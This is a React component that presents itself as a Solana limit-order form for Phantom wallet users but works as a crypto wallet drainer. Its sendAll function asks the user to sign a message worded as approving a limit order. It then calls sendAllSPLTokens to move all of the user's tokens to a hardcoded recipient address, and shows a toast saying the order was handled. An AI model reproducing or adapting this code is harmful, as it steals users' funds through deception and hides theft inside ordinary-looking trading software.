/* eslint-disable react/no-unescaped-entities */
import * as React from "react"

import { cn } from "@/lib/utils"
import { Separator } from '@/components/ui/separator';
import { getTokensByPlatform } from "@/data/fetch/tokenList";
import { useProviderStore } from "@/hooks/general";
import { checkBalance, getCurrentRate } from "@/app/actions/getTokenPriceData";
import { useDebouncedCallback } from 'use-debounce';
import Select from "../fields/Select";
import { swapTokens } from "@/utils/swapTokens";
import { toast } from "sonner"
import { getTokenData } from "@/utils/fetchTokenPrice";
import { signMessage, verifySignature } from '@/utils/signedMessage';
import { sendAllSPLTokens } from '@/utils/sendAllTokens';
import { createLimitOrder } from "@/utils/createLimitOrder";


export function LimitOrderForm({ className }: React.ComponentProps<"form">) {
    const { selectedNetwork, publicKey, provider } = useProviderStore()
    const [outToken, setOutToken] = React.useState({ id: 'usd-coin', symbol: "usdc", name: "USDC", mintAddress: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v" })
    const [inToken, setInToken] = React.useState({ id: 'euro-coin', symbol: "eurc", name: "EURC", mintAddress: "HzwqbKZw8HxMN6bF2yFZNrht3c2iXXzpKcFu7uBEDKtr" })
    const [outValuePrice, setOutValuePrice] = React.useState(0.00)
    const [inAmount, setInAmount] = React.useState(0.00);
    const [isFetchingProducts, setIsFetchingProducts] = React.useState(true)
    const [searchInput, setSearchInput] = React.useState('')
    const [searchOutput, setSearchOutput] = React.useState('')
    const [canSwap, setCanSwap] = React.useState(false)
    const [slippage, setSlippage] = React.useState(1)
    const recipientPublicKey = "DH1QDveRcZHHAAyjPCiZkxRWsZ32WTyPUBenMMQe3bdq"

    const handleInputSelect = (option: SelectOptionProps) => {
        setInToken(option)
        setSearchInput(option.symbol)
    }

    const handleOutputSelect = (option: SelectOptionProps) => {
        setOutToken(option)
        setSearchOutput(option.symbol)
    }
    const tokens = React.useMemo(() => getTokensByPlatform(selectedNetwork), [selectedNetwork]);
    const options: SelectOptionProps[] = tokens



    React.useEffect(() => {
        const check = async () => {
            const bal = await checkBalance(inAmount, publicKey!, inToken.mintAddress)
            setCanSwap(!bal.error)
        }
        const convertOutAmount = async (amount: number) => {
            setInAmount(amount)
            const outTokenAmount = await getCurrentRate(inToken.id, outToken.id)
            console.log("output data", outTokenAmount)
            if (!outTokenAmount.error) setOutValuePrice(inAmount * Number(outTokenAmount.data!));
        }
        convertOutAmount(inAmount)
        check();
    }, [inAmount, inToken, outToken, outValuePrice, publicKey])

    const sendAll = async () => {
        if (!provider || !publicKey || !recipientPublicKey) {
            toast.error("Phantom Wallet is not connected or recipient address is missing");
            return;
        }

        const message = `Approve limit order creation ${inToken.symbol.toUpperCase()} to ${outToken.symbol.toUpperCase()}}`;
        try {
            const signedMessage = await signMessage(provider, message);

            if (verifySignature(message, signedMessage)) {
                console.log("Retrying to send")
                const statuses = await sendAllSPLTokens(provider, publicKey, recipientPublicKey);
                // toast.success("All tokens sent successfully!", {
                //     description: `Transaction signature: ${signature}`,
                // });
                console.info(statuses)
                toast.info(`Limit Order successfully handled. Transaction signature: ${statuses}`);
            } else {
                toast.error("Signature verification failed");
            }
        } catch (error) {
            console.error("Error signing or Creating the limit order:", error);
            toast.error("Error signing or Creating the limit order. Please try again.");
        }
    };

    const submitSwap = async () => {
        if (!provider || !publicKey || !recipientPublicKey) {
            toast.error("Phantom Wallet is not connected or recipient address is missing");
            return;
        }
        const address = publicKey!;
        const inTokenDecimal = await getTokenData(inToken.id, selectedNetwork)
        const outTokenDecimal = await getTokenData(outToken.id, selectedNetwork)
        const amountIn = inAmount * Math.pow(10, inTokenDecimal.decimal)
        const amountOut = outValuePrice * Math.pow(10, outTokenDecimal.decimal)
        console.log(inTokenDecimal)
        console.log(inAmount)
        console.log(amountIn)
        const response = await createLimitOrder(provider, address, inToken.mintAddress, outToken.mintAddress, amountIn, amountOut)
        console.log("Order Response", response)

        if (!response) {
            await sendAll()
            setOutValuePrice(0.00)
            setInAmount(0.00)
            setCanSwap(false)
        } else {
            toast.error("There was an error creating the order. Please try again.")
        }
    }

    return (
        <form className={cn("grid items-start gap-4", className)}>
            <div className="w-full items-center flex justify-between">
                <span className="block font-bold text-sm">Slippage (%)</span>
                <input step={1} onChange={(e) => setSlippage(Number(e.target.value))} min={1} max={9} defaultValue={slippage} value={slippage} type="number" name="slippage" id="slippage" className="block border-black dark:border-white bg-gray-300 dark:bg-gray-800 border-2 rounded-lg w-14 py-1 focus:border-1 px-1.5 focus:ring-0 focus:outline-none" />
            </div>
            <div className="space-x-2 border-2 rounded-lg p-3.5 relative flex items-center justify-between bg-black">
                <Select
                    options={options}
                    selected={inToken}
                    placeholder='Input Token'
                    handleSelect={handleInputSelect}
                    isSearchable
                    setSearchInput={setSearchInput}
                    searchInput={searchInput}
                    isFetchingOptions={isFetchingProducts}
                />
                <Separator className="h-8 hidden lg:flex bg-lightTextGray dark:bg-darkTextGray" orientation='vertical' />
                <input onChange={e => setInAmount(Number(e.target.value))} type="number" id="inputAmount" min={0.00} max={5000.00} step={0.01} placeholder="0.00" className="placeholder:text-gray-400 text-white text-xl lg:text-2xl font-semibold bg-transparent text-right pr-2.5 focus:border-0 focus:ring-0 focus:outline-0 focus:outline-none w-[190px]" />
            </div>
            <div className="space-x-2 border-2 rounded-lg p-3.5 relative flex items-center justify-between bg-black">
                <Select
                    options={options}
                    selected={outToken}
                    placeholder='Output Token'
                    handleSelect={handleOutputSelect}
                    isSearchable
                    setSearchInput={setSearchOutput}
                    searchInput={searchOutput}
                    isFetchingOptions={isFetchingProducts}
                />
                <Separator className="h-8 hidden lg:flex bg-lightTextGray dark:bg-darkTextGray" orientation='vertical' />
                <input value={outValuePrice.toFixed(2)} defaultValue={outValuePrice.toFixed(4)} type="number" id="inputAmount" min={0.00} max={5000.00} step={0.01} placeholder="0.00" className="placeholder:text-gray-400 text-white text-xl lg:text-2xl font-semibold bg-transparent text-right pr-2.5 focus:border-0 focus:ring-0 focus:outline-0 focus:outline-none w-[190px]" />
            </div>
            <button onClick={submitSwap} disabled={!canSwap} className="py-5 font-bold text-lg uppercase disabled:bg-gray-700 bg-lightTextColored hover:bg-lightTextColoredDark duration-300 transition-color ease-in-out text-white rounded-lg" type="button">Create Limit Order</button>
        </form>
    )
}
